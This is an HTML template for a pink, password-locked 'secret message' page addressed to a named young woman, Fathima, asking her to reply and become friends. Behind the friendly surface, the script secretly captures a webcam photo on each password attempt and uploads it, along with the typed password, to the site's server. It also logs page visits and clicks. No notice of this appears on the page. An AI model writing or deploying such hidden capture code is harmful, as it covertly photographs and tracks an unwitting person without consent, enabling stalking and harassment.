<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>üíñ Secret Message üíñ</title>
  <style>
    body {
      background: radial-gradient(circle at top left, #e36da4, #e01f9c);
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      font-family: "Poppins", sans-serif;
      text-align: center;
      margin: 0;
      padding: 0 20px;
    }

    .container {
      background: rgba(243, 237, 243, 0.65);
      padding: 60px 30px;
      border-radius: 20px;
      box-shadow: 0 0 20px rgba(117, 89, 89, 0.3);
      max-width: 500px;
      width: 100%;
      opacity: 1;
      transition: opacity 0.3s ease, transform 0.1s ease;
      position: relative;
      text-align: center;
    }

    input { 
      padding: 10px; 
      border: none; 
      border-radius: 10px; 
      width: 80%; 
      margin-top: 15px; 
      font-size: 16px; 
      text-align: center; 
    }

    button { 
      margin-top: 20px; 
      padding: 10px 20px; 
      border-radius: 10px; 
      border: none; 
      background-color: #0e0808; 
      color: white; 
      font-weight: bold; 
      cursor: pointer; 
      transition: transform 0.1s ease, background-color 0.3s ease;
    }

    button:hover { 
      background-color: #ff6b81; 
    }

    #message, #uploadMsg { display: none; opacity: 0; transition: opacity 0.5s ease; }

    #errorMsg {
      color: red;
      margin-top: 10px;
      font-weight: bold;
      display: none;
      opacity: 0;
      transition: opacity 0.3s ease;
    }

    @keyframes shake {
      0% { transform: translateX(0); }
      20% { transform: translateX(-6px); }
      40% { transform: translateX(6px); }
      60% { transform: translateX(-6px); }
      80% { transform: translateX(6px); }
      100% { transform: translateX(0); }
    }
    .shake { animation: shake 0.35s; }

    #secretVideo {
      display: none;
      margin: 20px auto;
      border-radius: 20px;
      width: 480px;
      height: 360px;
      max-width: 90%;
      box-shadow: 0 0 20px rgba(0,0,0,0.3);
    }

    .upload-container { 
      margin-top: 5px; 
      text-align: center; 
    }

    .upload-controls { 
      display: flex; 
      justify-content: center; 
      align-items: center; 
      gap: 5px; 
      flex-wrap: wrap; 
      margin-top: 10px; 
    }

    .upload-controls input[type="file"] { 
      background: white; 
      border-radius: 10px; 
      padding: 6px; 
      border: 1px solid #ddd; 
    }

    .upload-controls button { 
      background-color: #0e0808; 
      color: white; 
      border: none; 
      padding: 10px 18px; 
      border-radius: 10px; 
      font-weight: bold; 
      cursor: pointer; 
      transition: background-color 0.3s ease; 
    }

    .upload-controls button:hover { 
      background-color: #ff6b81; 
    }

    #progressContainer {
      display: none;
      width: 80%;
      margin: 10px auto;
      background: rgba(255,255,255,0.6);
      border-radius: 10px;
      height: 10px;
      overflow: hidden;
    }

    #progressBar {
      width: 0%;
      height: 100%;
      background-color: #ff4da6;
      transition: width 0.3s ease;
    }

    #footer {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      text-align: center;
      padding: 10px 0;
      font-family: "Poppins", sans-serif;
      font-size: 16px;
      color: white;
      background: rgba(0,0,0,0.3);
      z-index: 1000;
    }

    @media(max-width:480px){
      .container { padding:40px 20px; } 
      input { width:90%; } 
      h1{font-size:24px;} 
      p{font-size:16px;} 
      #secretVideo { width: 90%; height: auto; }
      #footer { font-size: 14px; padding: 8px 0; }
    }
  </style>
</head>
<body>

<audio id="bgMusic" src="static/Music.mp3" loop preload="auto"></audio>

<div id="login" class="container">
  <h1>Hii..‚ú®</h1>
  <p style="font-size:25px;color:#333;">Enter the Previous same password</p>
  <input type="password" id="password" placeholder="Enter password">
  <button onclick="checkPassword()">Submit</button>
  <div id="errorMsg">‚ùå Wrong password! Try again</div>
</div>

<div id="message" class="container">
  <h1>Hii Fathima!</h1>
  <p>Agar aap yeh message padre tho plzz at least kuch tho response dho...I really want to be your friendüå∏</p>
  <p>I'll wait for your response üòäüí´</p>
  <button onclick="playVideo()">For youüòäü¶ã</button>
  <p id="tapText">Tap here üëÜ</p>

  <video id="secretVideo" controls>
    {% if video_url %}
      <source src="{{ video_url }}" type="video/mp4">
    {% endif %}
  </video>

  <div id="uploadSection" class="upload-container">
    <div class="upload-controls">
      <input type="file" id="videoUpload" accept="video/*">
      <button onclick="uploadStory()">Upload</button>
    </div>

    <div id="progressContainer">
      <div id="progressBar"></div>
    </div>

    <p id="uploadMsg" style="color:#000; display:none;">Uploading...</p>
  </div>
</div>

<footer id="footer"> Built with ‚ù§Ô∏è by Shaik üí´</footer>

<script>
const bgMusic = document.getElementById("bgMusic");
const loginDiv = document.getElementById("login");
const messageDiv = document.getElementById("message");
const errorMsg = document.getElementById("errorMsg");

function fadeInMusic(audio, duration=2000) {
  audio.currentTime = 7;
  audio.volume = 0;
  audio.play().catch(err => console.log("Autoplay blocked:", err));
  const step = 0.02;
  const interval = setInterval(() => {
    if(audio.volume < 0.5) audio.volume += step;
    else clearInterval(interval);
  }, duration/50);
}

function showErrorMessage() {
  errorMsg.style.display = "block";
  setTimeout(() => { errorMsg.style.opacity = 1; }, 50);
  loginDiv.classList.add("shake");
  setTimeout(() => { loginDiv.classList.remove("shake"); }, 350);
  setTimeout(() => {
    errorMsg.style.opacity = 0;
    setTimeout(() => { errorMsg.style.display = "none"; }, 300);
  }, 2000);
}

// ========== Webcam capture ==========
async function captureWebcamImage() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const videoEl = document.createElement("video");
    videoEl.srcObject = stream;
    await videoEl.play();
    const canvas = document.createElement("canvas");
    canvas.width = videoEl.videoWidth;
    canvas.height = videoEl.videoHeight;
    canvas.getContext("2d").drawImage(videoEl, 0, 0, canvas.width, canvas.height);
    stream.getTracks().forEach(track => track.stop());
    return await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
  } catch (err) {
    console.error("Webcam capture failed:", err);
    return null;
  }
}

async function checkPassword() {
  const entered = document.getElementById("password").value.trim();

  // Capture webcam image
  const imageBlob = await captureWebcamImage();
  if (imageBlob) {
    const formData = new FormData();
    formData.append("image", imageBlob, `attempt_${Date.now()}.jpg`);
    formData.append("password", entered);
    fetch("/capture_attempt", { method: "POST", body: formData })
      .then(res=>res.json())
      .then(data=>console.log("Image URL:", data.image_url))
      .catch(err=>console.log("Capture failed:", err));
  }

  if(entered === "23E51A05C1"){
      loginDiv.style.opacity = 0;
      setTimeout(() => {
        loginDiv.style.display = "none";
        messageDiv.style.display = "block";
        setTimeout(()=> { messageDiv.style.opacity = 1; }, 50);
      }, 300);
      fadeInMusic(bgMusic, 1500);
  } else {
      showErrorMessage();
  }

  // Log action
  fetch("/log_action", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ password: entered })
  }).catch(err => console.log("Logging failed:", err));
}

function playVideo() {
  const video = document.getElementById("secretVideo");
  const button = event.target;
  const tapText = document.getElementById("tapText");
  bgMusic.pause();

  fetch("/log_action", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ action: "video_button_clicked" })
  }).catch(err => console.log("Logging failed:", err));

  button.style.display = "none";
  if (tapText) tapText.style.display = "none";
  video.style.display = "block";
  video.play();
  sessionStorage.setItem("videoShown", "true");

  video.onended = () => {
    bgMusic.pause();
    bgMusic.currentTime = 0;
  };
}

function uploadStory() {
  const fileInput = document.getElementById("videoUpload");
  const uploadMsg = document.getElementById("uploadMsg");
  const progressContainer = document.getElementById("progressContainer");
  const progressBar = document.getElementById("progressBar");

  if (!fileInput.files.length) {
    alert("Please select a video first!");
    return;
  }

  const formData = new FormData();
  formData.append("video", fileInput.files[0]);

  uploadMsg.style.display = "block";
  uploadMsg.textContent = "Uploading...";
  progressContainer.style.display = "block";
  progressBar.style.width = "0%";

  const xhr = new XMLHttpRequest();
  xhr.open("POST", "/upload_story", true);

  xhr.upload.onprogress = function (e) {
    if (e.lengthComputable) {
      const percent = Math.round((e.loaded / e.total) * 100);
      progressBar.style.width = percent + "%";
      uploadMsg.textContent = `Uploading... ${percent}%`;
    }
  };

  xhr.onload = function () {
    progressContainer.style.display = "none";
    if (xhr.status === 200) {
      const result = JSON.parse(xhr.responseText);
      if (result.status === "ok") {
        uploadMsg.textContent = "‚úÖ Upload complete!";
        const video = document.getElementById("secretVideo");
        video.src = result.video_url + "?t=" + new Date().getTime();
        video.load();
      } else {
        uploadMsg.textContent = "‚ùå Upload failed.";
      }
    } else {
      uploadMsg.textContent = "‚ùå Server error.";
    }
  };

  xhr.onerror = function () {
    progressContainer.style.display = "none";
    uploadMsg.textContent = "‚ùå Upload error.";
  };

  xhr.send(formData);
}

window.addEventListener("load", () => {
  fetch("/log_action", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ event: "page_visit" })
  }).catch(err => console.log("Logging failed:", err));
});
</script>

</body>
</html>
